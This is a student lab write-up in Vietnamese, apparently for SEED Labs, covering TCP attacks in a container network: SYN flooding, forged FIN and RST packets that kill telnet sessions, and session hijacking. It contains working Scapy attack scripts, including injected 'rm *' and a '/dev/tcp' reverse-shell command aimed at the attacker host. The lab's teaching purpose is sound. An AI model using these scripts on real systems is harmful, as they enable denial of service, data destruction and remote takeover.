# TCP Attacks
## Task 1.1: Launching the Attack using Python
### Trước khi tấn công
- Máy victim `10.9.0.5`:  

![image](https://user-images.githubusercontent.com/44528004/142659729-0d784920-3119-4e08-8f2a-19c6ea40d299.png)

- Thử telnet từ `10.9.0.6` tới máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142659815-09c22988-80d6-4707-bfe2-62e4a7837569.png)
> Thành công.


### Tấn công
- Attack script:
```python
#! /bin/python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits


ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)
```

- Máy attacker:  

![image](https://user-images.githubusercontent.com/44528004/142659968-e6444920-365d-4697-9fb4-a6564ee4c2ad.png)

- Máy victim nhận được nhiều SYN packet để yêu cầu mở kết nối TCP:  

![image](https://user-images.githubusercontent.com/44528004/142660229-6f2e065a-9ac4-4ab5-93b8-2d4c0637d9a9.png)

- Thử telnet từ `10.9.0.6` tới máy victim nhưng vẫn thành công:  

![image](https://user-images.githubusercontent.com/44528004/142660351-b34b122c-fde1-4d84-b671-1e9545f2ff12.png)

#### Nguyên nhân
- Khi kiểm tra `tcp_max_syn_backlog` của máy victim thì ta thấy là có 256 half-open connection được cho phép lưu vào queue:  

![image](https://user-images.githubusercontent.com/44528004/142660561-988e0de1-60b5-4640-a6de-9aad4ff6da06.png)


- Tuy nhiên số lượng half-open connection được tạo ra khi attack chỉ dao động khoảng 125 connection.  

![image](https://user-images.githubusercontent.com/44528004/142660642-295d02f2-0d6c-421b-b58f-3f3d1f787f93.png)


- Vậy để attack thành công, ta cần giảm `tcp_max_syn_backlog`.  
    - Đợi cho các half-open connection cũ timeout:  
    
    ![image](https://user-images.githubusercontent.com/44528004/142660968-2fdf30bd-e93d-44a6-81e7-d5091516cdc6.png)

    - Giảm `tcp_max_syn_backlog=30` và tắt `tcp_syncookies`:  
    
    ![image](https://user-images.githubusercontent.com/44528004/142665650-d00f9fc7-1f2d-4f40-86c0-9930783e4737.png)




### Kết quả
- Tại máy victim `10.9.0.5`:
  - Rất nhiều kết nối TCP với source IP và source port khác nhau được tạo ra:  
  
  ![image](https://user-images.githubusercontent.com/44528004/142665940-d3dd8afe-d0c9-4602-b5be-78b069f1e445.png)


- Thử telnet vào máy victim thì thấy là trạng thái liên tục `Trying` và không thể kết nối tới máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142666504-4a42fb27-62da-45c2-82e4-a0336443e132.png)



## Task 1.2: Launching the Attack using C
### Tấn công
- [Attack script](https://github.com/datthinh1801/seed-labs/blob/master/category-network/TCP_Attacks/Labsetup/volumes/synflood.c)  
- Set `tcp_max_syn_backlog` về lại `256`.  

![image](https://user-images.githubusercontent.com/44528004/142666539-268a474a-1a58-4b5c-878b-96215770c7e5.png)

#### Python
- Attacker:  

![image](https://user-images.githubusercontent.com/44528004/142666633-7e394099-13ba-4fc6-80ec-168a19ab9dc8.png)


- Victim:  

![image](https://user-images.githubusercontent.com/44528004/142666687-afe2178d-41d1-4e21-8735-28039665af78.png)

- Thử telnet từ `10.9.0.6` tới victim:  

![image](https://user-images.githubusercontent.com/44528004/142666747-3c76e075-6b45-4b24-a69e-2974f307c1ba.png)
> Thành công

#### C
- Attacker:  

![image](https://user-images.githubusercontent.com/44528004/142667077-af3f0c6a-60a4-48ca-b486-e78592613d3b.png)

- Victim, có nhiều kết nối TCP với sourc IP và source port khác nhau được tạo ra:  

![image](https://user-images.githubusercontent.com/44528004/142667913-05da5d67-f7b0-411b-ab9b-02e591beefd2.png)  

![image](https://user-images.githubusercontent.com/44528004/142659029-6fe50e34-fbf6-4a7c-9095-dfad76bdf8f3.png)

- Telnet từ `10.9.0.6` tới victim:  

![image](https://user-images.githubusercontent.com/44528004/142668526-45d2ebf9-4774-4947-8628-acb65a126123.png)
> Attack thành công!  

#### Kết luận
- Vì C chạy nhanh hơn Python nên khi tấn công SYN Flood, C sẽ hiệu quả hơn. Theo mục **TCP retransmission issue** trong tài liệu hướng dẫn, sau mỗi 5 lần gửi lại gói tin SYN_ACK, nếu không thành công thì máy victim sẽ xóa connection khỏi queue và sẽ có thêm 1 slot trống. Nếu chúng ta attack nhanh thì gói tin attack sẽ lấp lỗ trống này ngay lập tức và các client hợp lệ sẽ không thể telnet đến victim. Ngược lại, nếu ta tấn công không đủ nhanh, client hợp lệ sẽ có thể tạo được connection.  

## Task 1.3: Enable the SYN Cookie Countermeasure
- Mở SYN cookie trên máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142670130-0c9326a7-70c2-47c7-b9bc-1016a042fb0a.png)

### Attack bằng Python
- Attacker:  

![image](https://user-images.githubusercontent.com/44528004/142670199-7fa0c750-bc86-4479-bd8b-7493f2f99cd4.png)


- Victim:  

![image](https://user-images.githubusercontent.com/44528004/142670274-2a15e636-3e54-406b-8171-8e94c6b89596.png)


- Telnet từ `10.9.0.6` tới máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142670344-5617ef36-2d41-4756-9158-c876581edd73.png)
> Telnet thành công. TẤN CÔNG THẤT BẠI.  

### Attack bằng C
- Attacker  

![image](https://user-images.githubusercontent.com/44528004/142670562-dedc7e13-7954-4fb4-a1b0-66439228aee9.png)


- Victim:  

![image](https://user-images.githubusercontent.com/44528004/142670589-fa6f3132-e8d1-4b6f-99d4-b168436d5100.png)


- Telnet tới victim:  

![image](https://user-images.githubusercontent.com/44528004/142670640-168902b7-b54c-45b0-8bc3-76b225915ffc.png)
> Telnet thành công. TẤN CÔNG THẤT BẠI.  

### Kết luận
Tấn công bằng Python và C đều thất bại khi SYN cookie được bật. Do đó, SYN cookie là 1 cơ chế chống TCP SYN flood hiệu quả.

## Task 2: TCP RST Attacks on telnet Connections
### Quan sát
- Sử dụng script sau để quan sát quá trình telnet:  

```python
#! /bin/python3
from scapy.all import *


def attack(packet):
    print(f'{packet[IP].src}:{packet[TCP].sport} > {packet[IP].dst}:{packet[TCP].dport}')
    print(f'\tSeq: {packet[TCP].seq}')
    print(f'\tAck: {packet[TCP].ack}')
    print(f'\tFlags: {packet[TCP].flags}')
    print(f'\tLen: {packet[IP].len}')
    
    
sniff(iface="br-96b833532993", store=False, filter="tcp and port 23", prn=attack)
```

- Kết quả:
```sh
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692662
	Ack: 0
	Flags: S
	Len: 60
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676056
	Ack: 3205692663
	Flags: SA
	Len: 60
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692663
	Ack: 552676057
	Flags: A
	Len: 52
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692663
	Ack: 552676057
	Flags: PA
	Len: 76
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676057
	Ack: 3205692687
	Flags: A
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676057
	Ack: 3205692687
	Flags: PA
	Len: 64
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692687
	Ack: 552676069
	Flags: A
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676069
	Ack: 3205692687
	Flags: PA
	Len: 67

# --snip--

10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676693
	Ack: 3205692757
	Flags: PA
	Len: 54
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692757
	Ack: 552676695
	Flags: A
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676695
	Ack: 3205692757
	Flags: FA
	Len: 52
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692757
	Ack: 552676696
	Flags: FA
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676696
	Ack: 3205692758
	Flags: A
	Len: 52
```

- Từ kết quả của đoạn script trên, t thấy hoạt động của telnet như sau:
	- Bắt tay 3 bước:
		- `.6` telnet đến `.5` nên `.6` gửi gói SYN với `seq=...662`
		- `.5` phản hồi với gói SYN-ACK có `seq=...056` và `ack=...663` (tương đương `...662 + 1`)
		- `.6` gửi gói ACK có `seq=...663` và `ack=...057` (tương đương `...056 + 1`)
	- Gửi data.
		- Trong quá trình này, mỗi bên sẽ gửi 1 gói ACK và 1 gói PSH-ACK cho 1 lần truyền dữ liệu.
		- Gói ACK sẽ acknowledge cho gói tin trước đó của bên kia, và gói PSH-ACK sẽ gửi data mới cho bên kia.
		- Điều đặc biệt là gói ACK và PSH-ACK này có cùng `seq` và `ack`.
		- Bên cạnh đó, quan sát kết quả của script ta thấy rằng, độ dài payload sẽ bằng độ dài của gói IP trừ cho 52. Ví dụ, gói IP có `len=76` thì payload sẽ có độ dài là `76 - 52 = 24 bytes`.
		```
		10.9.0.6:41652 > 10.9.0.5:23
			Seq: 3205692663
			Ack: 552676057
			Flags: PA
			Len: 76
		10.9.0.5:23 > 10.9.0.6:41652
			Seq: 552676057
			Ack: 3205692687
			Flags: A
			Len: 52
		```
### Attack
Từ các thông tin trên, ta có thể thực hiện attack tự động để kết thúc 1 kết nối telnet đang hoạt động như sau:
- Ta sẽ sniff các gói PSH-ACK, đổi chiều source/destination IP và port.
	> Ta không nên sniff gói ACK vì gói PSH-ACK sẽ thường được gửi ngay sau gói ACK. Do đó, bên gửi đã update `seq` và `ack` mới. Nếu ta sniff gói ACK và tính `seq` và `ack` dựa trên gói ACK thì `seq` và `ack` này sẽ thuộc vùng giá trị cũ và sẽ bị bỏ qua bởi bên gửi.  

- `seq` của gói RST sẽ bằng `ack` của gói PSH-ACK.
- `ack` của gói RST sẽ bằng `seq` của gói PSH-ACK + độ dài payload của gói PSH-ACK (`IP.len - 52`).
- Các trường còn lại như `window`, `chksum` sẽ được tính tự động hoặc sử dụng giá trị mặc định của `scapy`.


![image](https://user-images.githubusercontent.com/44528004/142788416-b6667cd7-2b35-4066-b059-7e581a8081d9.png)


- Attack script:
```python
#! /bin/python3
from scapy.all import *


def attack(packet):
    if packet[TCP].flags == 'PA':
        ip = IP(src=packet[IP].dst, dst=packet[IP].src)  
        next_ack = packet[TCP].seq + packet[IP].len - 52
        tcp = TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=packet[TCP].ack, ack=next_ack, flags='FA')
        reset_pkt = ip / tcp
        send(reset_pkt)


sniff(iface="br-96b833532993", store=False, filter="tcp and port 23", prn=attack)
```

### Kết quả
#### Tấn công 1 telnet connection đang hoạt động
- Tạo 1 kết nối telnet trước khi attacker chạy script attack:  

![image](https://user-images.githubusercontent.com/44528004/142776439-b914dcfe-33a6-4891-a80d-60997181e5a9.png)
> Máy attacker bên trái, máy `10.9.0.5` bên phải.  

- Attack chạy script:  

![image](https://user-images.githubusercontent.com/44528004/142776467-569000f1-2281-4ea1-94b5-155368290aba.png)

- User tiếp tục tương tác:  

![image](https://user-images.githubusercontent.com/44528004/142776479-41a6644e-dc98-43e4-9120-56fe955d58b7.png)
> Kết nối đã bị ngắt!  

#### Tấn công không cho tạo telnet connection
- Attacker chạy script attack:  

![image](https://user-images.githubusercontent.com/44528004/142776492-27fead24-bf5e-4452-a3c9-0f5770520bfa.png)

- Client tạo kết nối telnet:  

![image](https://user-images.githubusercontent.com/44528004/142776501-9a3285a0-0c64-4074-957c-fdbba6857693.png)
> Ngay lập tức mất kết nối!

### Attack bằng reset flag

- Tương tự với cách làm trên ta có thể sử dụng reset flag để terminate connection 

- Attack Script

```python
#! /bin/python3
from scapy.all import *


def attack(packet):
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)  
    tcp = TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=packet[TCP].ack, flags='R')
    reset_pkt = ip / tcp
    send(reset_pkt)


sniff(iface="br-9132eaaddac6", store=False, filter="tcp and port 23", prn=attack)
```

> Cho kết quả tương tự như trên
## Task3: TCP Session Hijacking
### Attack
Từ mô hình của task 2 và tấn công terminate connection thì ta dễ dàng thực hiện inject conmmand bằng cách thay đổi payload của gói PSH-ACK.

- Attack Script

```python
from scapy.all import *

def attack(packet):
    if packet[TCP].flags=='PA':
        ip = IP(src=packet[IP].dst,dst=packet[IP].src)
        next_ack = packet[TCP].seq + packet[IP].len - 52
        tcp = TCP(sport=packet[TCP].dport,dport=packet[TCP].sport,seq=packet[TCP].ack,ack=next_ack,flags='PA')
        data = 'rm *\n'
        reset_pkt = ip/tcp/data
        send(reset_pkt)


sniff(iface="br-9132eaaddac6",store=False,filter="tcp and port 23",prn=attack)
```

Command được inject là `rm *` (xóa tất cả các file trong thư mục hiện tại)

### Kết quả
- Máy victim trước khi bị tấn công 

![image](https://user-images.githubusercontent.com/31529599/142842326-4417598d-bff6-4a98-8eea-bf4b204bccbe.png)

- Tấn Công và kiểm tra kết quả

![image](https://user-images.githubusercontent.com/31529599/142842683-257db038-87a2-4832-8d21-605d410b2d10.png)

![image](https://user-images.githubusercontent.com/31529599/142842798-2e4404b3-11b1-45b1-990a-5288a0120406.png)

## Task 4: Creating Reverse Shell using TCP Session Hijacking

### Attack

Thay command `rm *` bằng command reverse shell `/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1`

Ip máy attacker: `10.9.0.1`

- Attack Script
```python
from scapy.all import *

def attack(packet):
    if packet[TCP].flags=='PA':
        ip = IP(src=packet[IP].dst,dst=packet[IP].src)
        next_ack = packet[TCP].seq + packet[IP].len - 52
        tcp = TCP(sport=packet[TCP].dport,dport=packet[TCP].sport,seq=packet[TCP].ack,ack=next_ack,flags='PA')
        data = '/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n'
        reset_pkt = ip/tcp/data
        send(reset_pkt)


sniff(iface="br-9132eaaddac6",store=False,filter="tcp and port 23",prn=attack)

```

Listening trên máy attacker

![image](https://user-images.githubusercontent.com/31529599/142843869-d7b87b44-2ac5-4d0d-a6a3-0bda505b55fe.png)


### Kết quả

![image](https://user-images.githubusercontent.com/31529599/142845036-9ce00c6b-0a45-4764-af1e-707527f13ce6.png)

Attack thành công
